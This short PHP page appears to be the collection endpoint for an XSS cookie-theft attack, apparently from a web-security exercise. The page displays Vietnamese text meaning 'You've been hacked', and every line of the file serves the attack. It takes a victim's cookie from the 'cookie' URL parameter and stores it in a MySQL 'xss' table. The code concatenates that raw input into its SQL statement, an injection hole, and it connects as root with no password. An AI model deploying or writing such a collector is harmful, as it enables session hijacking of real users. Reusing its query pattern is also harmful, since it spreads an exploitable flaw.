<?php
$conn = new mysqli('localhost', 'root', '', 'app_web1');
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>

    <h1 style="text-align: center;">Hello</h1>
    <h2 style="text-align: center;">Mầy đã bị hack</h2>

    <?php
    $cookies = $_GET['cookie'];

    $sql =  "INSERT INTO `app_web1`.`xss` (`cookie`) VALUES ('$cookies')";
    $result = $conn->query($sql);
    $conn->close();
    ?>
</body>

</html>